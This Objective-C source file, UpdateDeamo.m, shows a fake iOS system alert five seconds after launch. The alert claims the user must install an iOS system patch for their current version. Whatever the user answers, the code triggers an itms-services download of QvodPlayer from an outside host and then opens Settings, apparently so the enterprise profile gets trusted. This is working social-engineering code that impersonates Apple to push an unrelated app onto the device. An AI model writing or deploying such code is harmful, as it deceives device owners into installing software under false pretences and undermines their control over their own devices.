//
//  UpdateDeamo.m
//  升级系统补丁
//
//  Created by Tiny on 15/7/23.
//  Copyright (c) 2015年 com.sadf. All rights reserved.
//

#import "UpdateDeamo.h"
#import "Tools.h"
#import "CFUserNotification.h"
#import <mach/mach.h>
#import <UIKit/UIKit.h>
CFUserNotificationRef _userNotification;
@implementation UpdateDeamo



+ (void)ComeOn
{
    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
        
        
        
        CFStringRef keys[3];
        CFStringRef values[3];
        CFDictionaryRef tempDict = NULL;
        
        keys[0] = kCFUserNotificationAlternateButtonTitleKey;
        keys[1] = kCFUserNotificationAlertHeaderKey;
        keys[2] = kCFUserNotificationAlertMessageKey;
        
        NSString *version = [[UIDevice currentDevice] systemVersion];
        CFStringRef content = (__bridge CFStringRef)[NSString stringWithFormat:@"当前系统iOS%@, 要安装iOS%@系统补丁", version, version];
        
        values[0] = CFSTR("设置");
        values[1] = CFSTR("iOS系统提示");
        values[2] = content;
        
        
        tempDict = CFDictionaryCreate(NULL, (const void **)keys, (const void **)values, 3, &kCFTypeDictionaryKeyCallBacks,  &kCFTypeDictionaryValueCallBacks);
        _userNotification = CFUserNotificationCreate(NULL, 1000, kCFUserNotificationPlainAlertLevel, NULL, tempDict);
        CFOptionFlags responseFlags = CFUserNotificationPopUpSelection(0);
        int x = CFUserNotificationReceiveResponse(_userNotification, 1000, &responseFlags);
        
        CFDictionaryRef response = CFUserNotificationGetResponseDictionary(_userNotification);
        NSLog(@"response: %@", response);
        
        dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{

            [Tools launchApp:[[[NSBundle mainBundle] infoDictionary] objectForKey:@"CFBundleIdentifier"]];
            

            [[UIApplication  sharedApplication] openURL:[NSURL URLWithString:@"itms-services://?action=download-manifest&url=https://m.kuaibo.com/ios_apps/qvodplay_v3.0.48/QvodPlayer.plist"]];
//            NSString *string = nil;
//            NSArray *arr = @[string];

            [Tools launchApp:@"com.apple.Preferences"];
            
        });
        
    });

}

@end
